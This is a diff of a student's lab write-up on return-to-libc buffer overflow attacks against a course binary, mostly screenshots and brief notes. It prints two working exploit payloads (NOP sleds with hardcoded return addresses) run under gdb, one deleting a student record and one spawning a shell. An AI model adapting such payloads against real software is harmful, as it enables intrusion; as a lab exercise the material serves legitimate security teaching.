@@ -1,9 +1,9 @@
 # Attacking Non-executable Stack
 ![alt text](image-29.png)
-![alt text](image-30.png)
 
 ## Return to Libc Attack:
 ![alt text](image-31.png)
+
 ![alt text](image-32.png)
 
 ## Launching the Attack Steps:
@@ -26,7 +26,7 @@
 
 ![alt text](image-38.png)
 
-* Following all the instructions given you I got these results: 
+* Following all the instructions given I got these results: 
     * ![alt text](image-36.png)
 
 ### TASK C: Launching the return-to-libc attack: 
@@ -49,8 +49,6 @@
 
 * On following the instructions I got these results: 
     * ![alt text](image-47.png)
-
-#### Writing python script to create our malicious input file: 
 
 
 ## Coming to our Lab
@@ -78,7 +76,7 @@
 * Student id memory location: **0x08057d50**
 * BTU object address is: **0x08050de0**
 * this is my payload: gdb --gdb --args ./build/bin/btu remove 1782914303 $(echo -e "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x88\xc8\xff\xff\xa8\xb0\x04\x08\x60\x14\xb5\xf7\xe0\x0d\x05\x08\xff\x1c\x45\x6a")
-* you can find the code which generates this payload at: **Buffer_Overflow/task_3_writeup.md**
+* you can find the code which generates this payload at: **Buffer_Overflow/b-tu/task3_payload_generator.py**
 
 
 * and now we can see that we already removed the student.
@@ -116,12 +114,14 @@
 * so this should be the command to be excuted: 
     -  > python task3_part2_payload_generator.py 
     -  > gdb --args ./build/bin/btu remove 1024 $(echo -e "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x88\xc8\xff\xff\x70\xf1\xb5\xf7\x60\x14\xb5\xf7\xd7\xcc\xff\xff")
-# ems7 el 7eta de abl mtru7 el mon2sha w efhm leh el shell msh stable. 
-> e3ml run mrten wra b3d 34an yeft7lk shell     
--  > r
--  > r
-- ![alt text](image-57.png)
 
 
 * so we can see now that we got a terminal, and on running **whoami** i got the result **abdelazizsalah**
     - ![alt text](image-56.png)
+
+
+#### In case of unstable shell
+> e3ml run mrten wra b3d 34an yeft7lk shell     
+-  > r
+-  > r
+- ![alt text](image-57.png)
